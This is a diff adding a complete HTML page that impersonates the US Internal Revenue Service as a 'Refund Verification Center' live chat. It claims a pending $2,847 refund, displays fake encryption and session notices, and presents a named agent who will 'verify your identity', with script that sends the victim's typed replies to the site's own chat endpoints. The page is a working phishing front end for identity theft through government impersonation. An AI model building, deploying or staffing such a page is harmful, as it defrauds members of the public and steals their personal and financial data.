@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IRS Refund Verification Center — Live Agent Chat</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f4;color:#1a1a2e}
+.gov-header{background:#003087;color:#fff;padding:0 24px;height:60px;display:flex;align-items:center;gap:16px}
+.gov-header img{height:32px}
+.gov-header .brand{font-size:18px;font-weight:700}
+.gov-header .sub{font-size:12px;color:rgba(255,255,255,.7)}
+.alert-bar{background:#c5392a;color:#fff;text-align:center;padding:10px;font-size:13px;font-weight:600}
+.container{max-width:680px;margin:32px auto;padding:0 24px}
+.info-card{background:#fff;border-radius:12px;padding:24px;margin-bottom:20px;border-left:4px solid #003087;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+.info-card h2{font-size:16px;font-weight:700;margin-bottom:8px}
+.info-card p{font-size:13px;color:#444;line-height:1.6}
+.chat-panel{background:#fff;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,.12);overflow:hidden}
+.chat-hdr{background:#003087;color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}
+.agent-av{width:40px;height:40px;border-radius:50%;background:#f0ab00;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#003087;flex-shrink:0}
+.agent-nm{font-size:14px;font-weight:600}
+.agent-st{font-size:12px;color:#aef3a0;display:flex;align-items:center;gap:4px}
+.agent-st::before{content:'';width:6px;height:6px;border-radius:50%;background:#aef3a0}
+.chat-msgs{height:380px;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:10px;background:#f8f9fb}
+.msg{max-width:82%;padding:10px 14px;border-radius:14px;font-size:13px;line-height:1.55;white-space:pre-wrap;word-wrap:break-word}
+.msg-agent{background:#fff;border:1px solid #e5e7eb;align-self:flex-start;border-bottom-left-radius:4px}
+.msg-agent .sender{font-size:10px;font-weight:600;color:#636e72;margin-bottom:3px}
+.msg-user{background:#003087;color:#fff;align-self:flex-end;border-bottom-right-radius:4px}
+.msg-typing{align-self:flex-start;background:#fff;border:1px solid #e5e7eb;border-bottom-left-radius:4px;padding:12px 16px;display:none}
+.msg-typing.show{display:flex}
+.typing-dots{display:flex;gap:4px}.typing-dots span{width:6px;height:6px;border-radius:50%;background:#9ca3af;animation:bounce 1.4s infinite}
+.typing-dots span:nth-child(2){animation-delay:.2s}.typing-dots span:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-5px)}}
+.chat-inp-row{display:flex;gap:8px;padding:12px 16px;border-top:1px solid #e5e7eb}
+.chat-inp{flex:1;border:1px solid #d1d5db;border-radius:10px;padding:10px 14px;font-size:13px;outline:none;font-family:inherit}
+.chat-inp:focus{border-color:#003087}
+.send-btn{width:40px;height:40px;border-radius:10px;background:#003087;border:none;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.footer{text-align:center;font-size:11px;color:#999;margin-top:16px;padding-bottom:32px}
+</style>
+</head>
+<body>
+<div class="gov-header">
+  <div>
+    <div class="brand">Internal Revenue Service</div>
+    <div class="sub">United States Department of the Treasury</div>
+  </div>
+</div>
+<div class="alert-bar">⚠ SECURE REFUND VERIFICATION — This chat is encrypted with 256-bit TLS. Session ID: IRS-2026-748291</div>
+<div class="container">
+  <div class="info-card">
+    <h2>Your Refund is Ready for Verification</h2>
+    <p>Our records show a pending refund of <strong>$2,847.00</strong> for Tax Year 2025. To release the funds, our specialist will verify your identity through this secure chat. This process typically takes 5–10 minutes.</p>
+  </div>
+  <div class="chat-panel">
+    <div class="chat-hdr">
+      <div class="agent-av">SR</div>
+      <div>
+        <div class="agent-nm">Agent Sarah Rodriguez — IRS Refund Division</div>
+        <div class="agent-st">Secure Session Active</div>
+      </div>
+    </div>
+    <div class="chat-msgs" id="chatMsgs">
+      <div class="msg-typing" id="typingIndicator"><div class="typing-dots"><span></span><span></span><span></span></div></div>
+    </div>
+    <div class="chat-inp-row">
+      <input type="text" class="chat-inp" id="chatInput" placeholder="Type your response…" autocomplete="off">
+      <button class="send-btn" id="chatSend" onclick="sendMessage()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+      </button>
+    </div>
+  </div>
+  <div class="footer">IRS.gov | Privacy Notice | Accessibility | © 2026 Internal Revenue Service. All rights reserved.</div>
+</div>
+<script>
+var msgs=document.getElementById('chatMsgs');
+var typing=document.getElementById('typingIndicator');
+var input=document.getElementById('chatInput');
+var sending=false;
+function appendMsg(sender,text){
+  var div=document.createElement('div');div.className='msg '+(sender==='agent'?'msg-agent':'msg-user');
+  if(sender==='agent'){var nm=document.createElement('div');nm.className='sender';nm.textContent='Agent Rodriguez';div.appendChild(nm);}
+  var body=document.createElement('div');body.textContent=text;div.appendChild(body);
+  msgs.insertBefore(div,typing);msgs.scrollTop=msgs.scrollHeight;
+}
+function showTyping(){typing.classList.add('show');msgs.scrollTop=msgs.scrollHeight;}
+function hideTyping(){typing.classList.remove('show');}
+fetch('/api/chat/start',{method:'POST',headers:{'Content-Type':'application/json'}})
+  .then(r=>r.json()).then(d=>{hideTyping();appendMsg('agent',d.message);});
+window.sendMessage=function(){
+  if(sending)return;var text=input.value.trim();if(!text)return;
+  input.value='';appendMsg('user',text);
+  sending=true;document.getElementById('chatSend').disabled=true;showTyping();
+  fetch('/api/reply',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:text})})
+    .then(r=>r.json()).then(d=>{hideTyping();sending=false;document.getElementById('chatSend').disabled=false;appendMsg('agent',d.message);})
+    .catch(()=>{hideTyping();sending=false;document.getElementById('chatSend').disabled=false;});
+};
+input.addEventListener('keydown',e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendMessage();}});
+showTyping();
+</script>
+</body>
+</html>
